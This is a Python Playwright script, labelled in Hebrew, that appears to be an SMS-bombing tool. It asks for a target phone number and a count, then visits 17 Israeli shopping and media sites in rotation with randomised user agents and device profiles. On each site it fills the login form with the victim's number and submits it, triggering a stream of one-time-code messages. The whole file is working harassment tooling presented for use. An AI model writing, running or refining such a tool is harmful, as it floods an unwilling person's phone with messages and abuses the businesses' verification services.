import asyncio
import random
import sys
import os
import signal
import time
from playwright.async_api import async_playwright

# ==========================================
# Global State for Signal Handling
# ==========================================
running = True

def signal_handler(sig, frame):
    global running
    print("\n\n\033[91m[!] עצירה מזוהה! מפסיק את הפעילות מיד...\033[0m")
    running = False

signal.signal(signal.SIGINT, signal_handler)

# ==========================================
# Configuration & Sites
# ==========================================
DEVICE_PROFILES = [
    {"name": "Windows 11 PC (Chrome 125)", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36", "viewport": {"width": 1920, "height": 1080}, "is_mobile": False},
    {"name": "MacBook Pro (Safari 17)", "user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15", "viewport": {"width": 1728, "height": 1117}, "is_mobile": False},
    {"name": "iPhone 15 Pro Max (Safari)", "user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1", "viewport": {"width": 430, "height": 932}, "is_mobile": True}
]

SITES_CONFIG = [
    {
        'name': 'Teva Naot', 
        'url': 'https://www.tevanaot.co.il/', 
        'icon_selector': 'button:has-text("התחברות"), .user-icon, a[href*="account"]',
        'phone_selector': 'input[type="tel"], input[name*="phone"]', 
        'submit_selector': 'button[type="submit"], button:has-text("התחבר")',
        'jokes': ["בודק אם הנעליים במידה שלי...", "מחפש סנדלים לקיץ, אולי יש מבצע!", "מנסה להבין אם אני נועל נכון..."]
    },
    {
        'name': 'Top Ten', 
        'url': 'https://www.topten-fashion.com/', 
        'icon_selector': 'a[href*="login"], .login-btn, .user-icon',
        'phone_selector': 'input[type="tel"], input[name*="phone"]', 
        'submit_selector': 'button[type="submit"], .submit-btn',
        'jokes': ["מחפש עגילים שמתאימים לבוט שלי...", "בודק אם יש הנחה על תכשיטים.", "מנסה להבין כמה אקססוריז זה יותר מדי..."]
    },
    {
        'name': 'Housemen', 
        'url': 'https://housemen.co.il/', 
        'icon_selector': 'a[href*="my-account"], .user-icon, .login-link',
        'phone_selector': 'input[type="tel"], input[name*="phone"], #username', 
        'submit_selector': 'button[name="login"], button[type="submit"]',
        'jokes': ["מחפש חולצה לחתונה וחוזר!", "בודק אם יש חליפות במידה של שרת...", "מנסה להיראות אלגנטי בשביל האתר הזה."]
    },
    {
        'name': 'Lee Cooper', 
        'url': 'https://www.leecooper.co.il/', 
        'icon_selector': '#customer-login-link, a:has-text("התחברות"), .login-link',
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': 'button[type="submit"], .submit-login',
        'jokes': ["מחפש ג'ינס שיושב בול!", "בודק אם יש מבצע על לי קופר קידס.", "מנסה להבין אם ג'ינס קרוע זה עדיין באופנה..."]
    },
    {
        'name': 'Papa Johns', 
        'url': 'https://www.papajohns.co.il/shop/', 
        'icon_selector': 'a:has-text("התחברות"), .login-btn, .user-icon',
        'phone_selector': 'input[type="tel"], input[name*="phone"]', 
        'submit_selector': 'button[type="submit"], .login-submit',
        'jokes': ["מזמין פיצה עם אקסטרה קודים!", "בודק אם יש משלוח לשרת שלי...", "מחפש את הרוטב הסודי של פאפא."]
    },
    {
        'name': 'Timberland', 
        'url': 'https://www.timberland.co.il/', 
        'icon_selector': '#customer-login-link, a:has-text("התחברות"), .login-link',
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': 'button[type="submit"], .submit-login',
        'jokes': ["מחפש נעליים לטיול בתוך הקוד...", "בודק אם יש מגפיים חסיני מים לבוט.", "מנסה להבין אם אני הרפתקני מספיק."]
    },
    {
        'name': 'Hamal', 
        'url': 'https://hamal.co.il/settings', 
        'icon_selector': 'a:has-text("התחברות"), .login-btn',
        'phone_selector': 'input[type="text"], input[placeholder*="טלפון"]', 
        'submit_selector': 'input[type="submit"], button:has-text("שלחו לי קוד")',
        'jokes': ["בודק אם יש חדשות חמות!", "מנסה להבין אם זה חמ\"ל או חמ\"ד...", "מחפש את הסקופ הבא."]
    },
    {
        'name': 'Kiko Milano', 
        'url': 'https://www.kikocosmetics.co.il/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\"), .user-icon",
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': 'button[type="submit"], .login-button',
        'jokes': ["מחפש את הגוון המושלם לשפתיים!", "בודק אם יש סייל על איפור.", "מנסה להיראות יפה בשביל האתר."]
    },
    {
        'name': 'Victoria Secret', 
        'url': 'https://www.victoriassecret.co.il/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\"), .login-link",
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': 'button[type="submit"], .submit-login',
        'jokes': ["מחפש את המלאך השומר שלי...", "בודק אם יש מבצעים סודיים.", "מנסה להבין את הסוד של ויקטוריה."]
    },
    {
        'name': 'FreeTV', 
        'url': 'https://web.freetv.tv/subscriber/login', 
        'icon_selector': None,
        'phone_selector': '#msisdn, input[placeholder*="מספר נייד"]', 
        'submit_selector': 'button:has-text("קדימה")',
        'jokes': ["מנסה להתחבר לשידור חי!", "בודק אם יש סרט טוב ברקע.", "מחפש את השלט..."]
    },
    {
        'name': 'Delta', 
        'url': 'https://www.delta.co.il/fsale', 
        'icon_selector': '#customer-login-link, a:has-text("התחברות")',
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': '#send2, button[type="submit"]',
        'jokes': ["בודק אם יש מבצעים על תחתונים.", "מנסה להבין אם אני צריך עוד גרביים.", "מחפש את המידה הנכונה."]
    },
    {
        'name': 'Naaman', 
        'url': 'https://www.naamanp.co.il/', 
        'icon_selector': 'a:has-text("התחברות"), .customer-login-link',
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': '#send2, button[type="submit"]',
        'jokes': ["מחפש סיר לחץ לשליחה בלחץ!", "בודק אם יש כלי מטבח חדש.", "מנסה להבין אם אני בשלן."]
    },
    {
        'name': 'Golf Kids', 
        'url': 'https://www.golfkids.co.il/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\")",
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': '#send2, button[type="submit"]',
        'jokes': ["מנסה להבין אם הילדים כבר ישנים.", "בודק אם יש צעצוע חדש.", "מחפש את הילד הפנימי שבי."]
    },
    {
        'name': 'Castro', 
        'url': 'https://www.castro.com/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\")",
        'phone_selector': 'input[type="tel"], #mobile_number', 
        'submit_selector': '.submit-login, button[type="submit"]',
        'jokes': ["מחפש את הטרנד הבא.", "בודק אם יש לי מספיק סטייל.", "מנסה להבין אם אני צריך עוד בגדים."]
    },
    {
        'name': 'Hoodies', 
        'url': 'https://www.hoodies.co.il/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\")",
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': '#send2, button[type="submit"]',
        'jokes': ["מחפש קפוצ'ון חם לחורף.", "בודק אם יש סייל על קפוצ'ונים.", "מנסה להבין אם אני צריך עוד קפוצ'ון."]
    },
    {
        'name': 'Aldo', 
        'url': 'https://www.aldoshoes.co.il/', 
        'icon_selector': ".customer-login-link, a:has-text(\"התחברות\")",
        'phone_selector': 'input[name="login[username]"], input[type="tel"]', 
        'submit_selector': '#send2, button[type="submit"]',
        'jokes': ["בודק אם יש נעליים חדשות.", "מנסה להבין אם אני צריך עוד נעליים.", "מחפש את המידה הנכונה."]
    },
    {
        'name': 'Joe Delek', 
        'url': 'https://www.joedelek.co.il/loginpage', 
        'icon_selector': None,
        'phone_selector': 'input[type="tel"], #phone', 
        'submit_selector': 'button[type="submit"], button:has-text("התחבר")',
        'jokes': ["עצרתי רגע לתדלק, כבר חוזר!", "בודק אם יש איזה קפה טוב בתחנה.", "מנסה להבין אם אני צריך עוד דלק."]
    }
]

# ==========================================
# UI Helpers
# ==========================================
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_header():
    header = r"""
\033[96m
   _   _   _   _   _   _   _   _   _  
  / \ / \ / \ / \ / \ / \ / \ / \ / \ 
 ( A | L | O | N | O | S | H | E | M )
  \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ \_/ 
\033[0m
\033[95m[+] מערכת אוטומציה מתקדמת לשליחת קודים\033[0m
\033[90m----------------------------------------\033[0m
"""
    print(header)

def print_progress_bar(iteration, total, message=""):
    percent = ("{0:.1f}").format(100 * (iteration / float(total)))
    filled_length = int(40 * iteration // total)
    bar = '█' * filled_length + '░' * (40 - filled_length)
    color = "\033[92m" if iteration == total else "\033[94m"
    reset = "\033[0m"
    sys.stdout.write(f'\r{color}Progress: |{bar}| {percent}% {reset} >> {message[:60]}...')
    sys.stdout.flush()
    if iteration == total: print()

# ==========================================
# Enhanced Automation Logic
# ==========================================
async def handle_popups(page):
    selectors = [
        '.close-popup', '.close-modal', 'button[aria-label="Close"]', 
        '.modal-close', 'button:has-text("X")', '.newsletter-popup-close',
        'div[role="dialog"] button:has-text("X")', 'div[role="dialog"] button[aria-label*="close"]',
        '.elementor-location-popup .elementor-button-link', '.popup-close', '#close-button'
    ]
    for s in selectors:
        try:
            el = page.locator(s).first
            if await el.is_visible(timeout=1000):
                await el.click()
        except: continue

async def handle_cookies(page):
    selectors = [
        'button:has-text("אישור")', 'button:has-text("Accept")', 
        '#btn-cookie-allow', 'button:has-text("אני מסכים")',
        'button[id*="cookie"]', 'button[class*="cookie"]', '#CybotCookiebotDialogBodyLevelButtonLevelOptinAllowAll'
    ]
    for s in selectors:
        try:
            el = page.locator(s).first
            if await el.is_visible(timeout=1000):
                await el.click()
                break
        except: continue

async def run_on_site(browser, site, phone):
    if not running: return False
    profile = random.choice(DEVICE_PROFILES)
    context = await browser.new_context(user_agent=profile['user_agent'], viewport=profile['viewport'])
    page = await context.new_page()
    
    try:
        await page.goto(site['url'], wait_until="domcontentloaded", timeout=30000)
        await asyncio.sleep(3)
        await handle_cookies(page)
        await handle_popups(page)
        
        # Site-specific logic (e.g., Housemen automatic login message)
        if site['name'] == 'Housemen':
            # Check for automatic login message/popup
            try:
                msg_selector = 'a:has-text("התחברות"), .elementor-button-link[href*="login"]'
                if await page.locator(msg_selector).first.is_visible(timeout=2000):
                    await page.locator(msg_selector).first.click()
                    await asyncio.sleep(2)
            except: pass

        if site['icon_selector']:
            try:
                icon_selectors = [s.strip() for s in site['icon_selector'].split(',')] + \
                                 ['a[href*="login"]', '.user-icon', 'a:has-text("התחברות")', '.login-link']
                for s in icon_selectors:
                    icon = page.locator(s).first
                    if await icon.is_visible(timeout=3000):
                        await icon.click()
                        await asyncio.sleep(2)
                        await handle_popups(page)
                        break
            except: pass
            
        found = False
        phone_selectors = [s.strip() for s in site['phone_selector'].split(',')] + \
                          ['input[type="tel"]', 'input[name*="phone"]', 'input[placeholder*="טלפון"]', 'input[placeholder*="נייד"]']
        
        for s in phone_selectors:
            try:
                el = page.locator(s).first
                if await el.is_visible(timeout=4000):
                    await el.scroll_into_view_if_needed()
                    await el.click()
                    await el.fill("")
                    await el.type(phone, delay=100)
                    found = True
                    break
            except: continue
            
        if found:
            await asyncio.sleep(1)
            submit_selectors = [s.strip() for s in site['submit_selector'].split(',')] + \
                               ['button[type="submit"]', 'button:has-text("המשך")', 'button:has-text("שלח")', 'button:has-text("התחברות")']
            for s in submit_selectors:
                try:
                    el = page.locator(s).first
                    if await el.is_visible(timeout=4000) and await el.is_enabled():
                        await el.click()
                        await asyncio.sleep(5)
                        return True
                except: continue
        return False
    except: return False
    finally: await context.close()

async def main():
    global running
    clear_screen()
    print_header()
    
    print("\033[93m[!] הוראות שימוש:\033[0m")
    print("1. הכנס מספר טלפון בפורמט מלא.")
    print("2. בחר כמות הודעות (10-100).")
    print("3. הסקריפט יבצע סבבים אוטומטיים עד להשלמת המשימה.")
    print("\033[91mלעצירה מיידית - לחץ Ctrl+C\033[0m\n")
    
    if os.getenv("TEST_MODE") == "1":
        phone = "0501234567"
        total_to_send = 17 # One for each site
        print(f"\033[96m[TEST MODE] מספר טלפון: {phone}\033[0m")
        print(f"\033[96m[TEST MODE] כמות הודעות: {total_to_send}\033[0m")
    else:
        phone = input("\033[96mהכנס מספר טלפון: \033[0m").strip()
        if not phone or len(phone) < 9:
            print("\033[91m[!] מספר לא תקין.\033[0m")
            return
        try:
            count_input = input("\033[96mכמות הודעות (10-100): \033[0m").strip()
            total_to_send = int(count_input)
            if not (10 <= total_to_send <= 100):
                total_to_send = 10
        except ValueError:
            total_to_send = 10

    print(f"\n\033[92m[⚡] מתחיל פעילות עבור {phone}... Boom!\033[0m\n")
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        sent_count = 0
        while sent_count < total_to_send and running:
            random_sites = list(SITES_CONFIG)
            random.shuffle(random_sites)
            for site in random_sites:
                if sent_count >= total_to_send or not running: break
                msg = random.choice(site['jokes'])
                print_progress_bar(sent_count, total_to_send, f"עובד על {site['name']} | {msg}")
                success = await run_on_site(browser, site, phone)
                if success: sent_count += 1
                if running: await asyncio.sleep(random.uniform(4, 8))
            
        if running:
            print_progress_bar(total_to_send, total_to_send, "המשימה הושלמה בהצלחה! כל הקודים נשלחו.")
        else:
            print(f"\n\033[93m[!] הריצה הופסקה ע\"י המשתמש. נשלחו {sent_count} הודעות.\033[0m")
        await browser.close()

if __name__ == "__main__":
    try: asyncio.run(main())
    except KeyboardInterrupt: pass
